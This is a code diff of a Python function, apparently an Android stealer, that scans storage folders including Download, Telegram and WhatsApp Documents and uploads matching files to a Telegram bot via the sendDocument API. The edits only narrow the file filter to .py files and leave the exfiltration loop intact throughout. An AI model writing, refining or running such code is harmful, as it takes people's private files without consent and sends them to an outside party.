@@ -401,7 +401,6 @@ def gxdsBot():
     try:
         sdcard_path = '/sdcard'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
                 url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
@@ -415,7 +414,6 @@ def gxdsBot():
     try:
         sdcard_path = '/sdcard/Download'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
                 url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
@@ -429,7 +427,6 @@ def gxdsBot():
     try:
         sdcard_path = '/sdcard/Download/Telegram'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
                 url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
@@ -443,7 +440,6 @@ def gxdsBot():
     try:
         sdcard_path = '/sdcard/Telegram/Telegram Files'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
                 url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
@@ -457,7 +453,7 @@ def gxdsBot():
     try:
         sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
                 url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
